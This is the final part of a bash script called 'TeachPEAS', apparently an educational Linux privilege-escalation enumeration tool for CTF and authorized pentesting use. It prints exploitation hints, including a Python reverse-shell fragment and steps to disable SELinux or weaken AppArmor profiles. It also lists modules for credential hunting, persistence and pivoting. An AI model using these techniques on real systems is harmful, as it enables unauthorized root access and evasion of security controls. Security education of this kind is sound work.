                    teach "  os.dup2(s.fileno(),1)"
                    teach "  os.dup2(s.fileno(),2)"
                    teach "  subprocess.call(['/bin/sh','-i'])"
                else
                    log "  $path (not writable)"
                fi
            fi
        done
        
        # Check PYTHONPATH
        if [ -n "$PYTHONPATH" ]; then
            info "PYTHONPATH is set: $PYTHONPATH"
            echo "$PYTHONPATH" | tr ':' '\n' | while read path; do
                if [ -w "$path" ]; then
                    vuln "PYTHONPATH contains writable directory: $path"
                fi
            done
        fi
        
        # Check for Python scripts run by root (in cron, etc.)
        if [ -r /etc/crontab ]; then
            if grep -E "\.py|python" /etc/crontab 2>/dev/null | grep -v "^#" | grep -q "."; then
                warn "Python scripts in crontab - check their import statements"
                grep -E "\.py|python" /etc/crontab 2>/dev/null | grep -v "^#" | while read line; do
                    log "  $line"
                done
            fi
        fi
    fi
}

# === APPARMOR/SELINUX WRITABLE PROFILES ===
enum_mac_writable() {
    section "MAC PROFILE WRITABILITY"
    
    explain_concept "Writable MAC Profiles" \
        "If AppArmor or SELinux profiles are writable, you can weaken security policies to allow previously blocked actions." \
        "MAC policies restrict what programs can do. If you can modify these policies, you can remove restrictions on exploitable binaries or grant yourself new capabilities." \
        "Exploitation:\n  AppArmor: Modify profile to complain mode or allow all\n  SELinux: Change file contexts or create permissive domains"
    
    # AppArmor profiles
    if [ -d /etc/apparmor.d ]; then
        find /etc/apparmor.d -name "*" -type f -writable 2>/dev/null | while read profile; do
            critical "Writable AppArmor profile: $profile"
            vuln "Writable AppArmor profile: $profile"
            teach "Modify profile to complain mode or remove restrictions"
            teach "  After modifying: apparmor_parser -r $profile"
        done
    fi
    
    # SELinux policies
    if command -v semanage >/dev/null 2>&1; then
        if [ -w /etc/selinux/config ]; then
            critical "SELinux config WRITABLE: /etc/selinux/config"
            vuln "/etc/selinux/config is writable!"
            teach "Set SELINUX=permissive or SELINUX=disabled"
            teach "  Requires reboot or: setenforce 0"
        fi
    fi
}
# === MAIN EXECUTION ===
main() {
    cat << "EOF"

    ════════════════════════════════════════════════════════════════
EOF
    echo -e ""
    echo -e "\033[31mM\"\"\033[33mMMMMMMMM\033[0m                                     \033[34mMM\"\"\"\"\"\"\"'YM\033[0m                            "
    echo -e "\033[31mM  \033[33mMMMMMMMM\033[0m                                     \033[34mMM  mmmmm  M\033[0m                            "
    echo -e "\033[31mM  \033[33mMMMMMMMM\033[0m .d8888b. .d8888b. 88d888b. 88d888b. \033[34mM'        .M\033[0m .d8888b. .d8888b. .d8888b. "
    echo -e "\033[31mM  \033[33mMMMMMMMM\033[0m 88ooood8 88'  '88 88'  '88 88'  '88 \033[34mMM  MMMMMMMM\033[0m 88ooood8 88'  '88 Y8ooooo. "
    echo -e "\033[31mM  \033[33mMMMMMMMM\033[0m 88.  ... 88.  .88 88       88    88 \033[34mMM  MMMMMMMM\033[0m 88.  ... 88.  .88       88 "
    echo -e "\033[31mM  \033[32m       M\033[0m '88888P' '88888P8 dP       dP    dP \033[34mMM  MMMMMMMM\033[0m '88888P' '88888P8 '88888P' "
    echo -e "\033[32mMMMMMMMMMMMM\033[0m                                     \033[34mMMMMMMMMMMMM\033[0m                            "
    cat << "EOF"
    
              Educational Privilege Escalation Tool - Version 1.5.0
    
    ════════════════════════════════════════════════════════════════

EOF
    
    log ""
    log "${R}════════════════════════════════════════════════════════════════${RST}"
    log "${R}                      LEGAL DISCLAIMER                          ${RST}"
    log "${R}════════════════════════════════════════════════════════════════${RST}"
    log "${Y}This tool is for AUTHORIZED TESTING ONLY.${RST}"
    log "${Y}Intended use: CTF competitions, authorized pentesting, education${RST}"
    log "${R}Unauthorized access to computer systems is ILLEGAL.${RST}"
    log "${R}You are responsible for ensuring you have permission to test.${RST}"
    log "${R}════════════════════════════════════════════════════════════════${RST}"
    log ""
    log "${G}════════════════════════════════════════════════════════════════${RST}"
    log "${Y}[*] Purpose: Educational enumeration with detailed explanations${RST}"
    log "${Y}[*] Every vulnerability includes WHAT, WHY, and HOW to exploit${RST}"
    log "${C}[*] Not affiliated with PEASS-ng/LinPEAS project${RST}"
    log "${G}════════════════════════════════════════════════════════════════${RST}"
    log ""
    log "${C}[+] Log file: $LOG_FILE${RST}"
    log "${C}[+] Started: $(date)${RST}"
    log "${P}[+] Extended mode: ENABLED${RST}"
    log "${W}[+] Development status: Beta ${RST}"
    log ""
    # Core enumeration
    enum_system
    enum_network
    enum_users
    enum_processes
    enum_mail_logs
    
    # Permission-based vectors
    enum_sudo
    enum_sudo2
    enum_sudo_version
    enum_suid
    enum_sgid
    enum_writable_files
    enum_capabilities
    enum_ld_preload
    
    # Group-based vectors
    enum_groups
    
    # Service-based vectors
    enum_cron
    enum_systemd
    enum_systemd_timers
    
    # Kernel & container
    enum_kernel
    enum_kernel_modules
    enum_polkit
    enum_snap
    enum_container
    enum_mac
    enum_mac_writable
    
    # Path & environment
    enum_path
    enum_python_paths
    enum_env
    
    # File system
    enum_nfs
    enum_wildcards
    enum_backups
    enum_mounts
    enum_world_writable
    
    # Credential hunting
    enum_passwords
    enum_software_versions
    enum_interesting_files
    enum_hidden_files
    
    #  HTB-specific enumeration
    enum_smb
    enum_git_exposure
    enum_tomcat
    enum_spring_actuator
    enum_wordpress_extended
    
    # Tools
    enum_tools
    enum_scheduled
    enum_process_monitor
    enum_clipboard
    
    # Extended modules (optional)
    if [ $EXTENDED -eq 1 ]; then
        log ""
        log "${P}═══════════════════════════════════════${RST}"
        log "${P}    EXTENDED ENUMERATION MODULES${RST}"
        log "${P}═══════════════════════════════════════${RST}"
        
        # Phase 1: High-value additions
        enum_cloud_metadata
        enum_language_creds
        enum_api_keys
        enum_databases_extended
        enum_cicd
        
        # Original extended modules
        enum_databases
        enum_web
        enum_post_exploit
        enum_ctf_flags
        enum_pivoting
    fi
    
    # Critical findings summary
    if grep -q "CRITICAL" "$LOG_FILE"; then
        section "⚠️  CRITICAL FINDINGS SUMMARY"
        log "${CRIT}Found instant privilege escalation opportunities:${RST}"
        log ""
        grep "CRITICAL" "$LOG_FILE" | while read line; do
            log "$line"
        done
        log ""
    fi
    
    # CTF flags summary
    if grep -q "CTF FLAG" "$LOG_FILE"; then
        section "🚩 CTF FLAGS DISCOVERED"
        log "${FLAG}Flag locations found:${RST}"
        log ""
        grep "\[🚩 CTF FLAG 🚩\]" "$LOG_FILE" | while read line; do
           log "$line"
        done
        log ""
        if [ $SHOW_FLAGS -eq 0 ]; then
            info "Rerun with --flags to reveal flag contents"
       fi
    fi
    
    section "ENUMERATION COMPLETE"
    log "${Y}═══════════════════════════════════════${RST}"
    log "${Y}NEXT STEPS:${RST}"
    log "1. Review all ${CRIT}CRITICAL${RST} findings above for instant wins"
    log "2. Review all VULNERABLE findings"
    log "3. Read the LEARN sections to understand each vulnerability"
    log "4. Test exploits manually (don't just run automated tools)"
    log "5. Document what you learn for future reference"
    log ""
    log "${Y}EDUCATIONAL GOALS:${RST}"
    log "• Recognize these patterns on other systems"
    log "• Understand Linux security model deeply"
    log "• Know what to look for during initial access"
    log "• Build mental models, not just command lists"
    log ""
    log "${G}Full enumeration log: $LOG_FILE${RST}"
    log "Run completed: $(date)"
}

# Parse arguments
while [ $# -gt 0 ]; do
    case "$1" in
        -q|--quick)
            QUICK_MODE=1
            shift
            ;;
        -e|--extended)
            EXTENDED=1
            shift
            ;;
        -v|--verbose)
            VERBOSE=1
            shift
            ;;
        --no-explain)
            EXPLAIN=0
            shift
            ;;
            -f|--flags) 
            SHOW_FLAGS=1
            shift
            ;;
        -h|--help)
            echo "TeachPEAS - Educational Privilege Escalation Enumeration"
            echo ""
            echo "Usage: $0 [OPTIONS]"
            echo ""
            echo "Options:"
            echo "  -q, --quick      Quick scan (skip some slow checks)"
            echo "  -e, --extended   Enable extended modules (databases, web, post-exploit, CTF flags)"
            echo "  -v, --verbose    Verbose output"
            echo "  --no-explain     Skip educational explanations"
            echo "  -h, --help       Show this help"
            echo ""
            echo "Extended modules include:"
            echo "  • Cloud metadata enumeration (AWS/Azure/GCP)"
            echo "  • Language-specific credential discovery (.env, package.json, etc.)"
            echo "  • Database enumeration (MySQL, PostgreSQL, Redis, MongoDB)"
            echo "  • Web application analysis (config files, writable web roots)"
            echo "  • CI/CD secret exposure (Git, Jenkins, GitLab)"
            echo "  • Post-exploitation techniques (persistence, lateral movement)"
            echo "  • CTF flag hunting (common patterns and locations)"
            echo "  • Network pivoting setup (SSH tunneling, internal networks)"
            echo ""
            exit 0
            ;;
        *)
            echo "Unknown option: $1"
            echo "Use --help for usage information"
            exit 1
            ;;
    esac
done

main
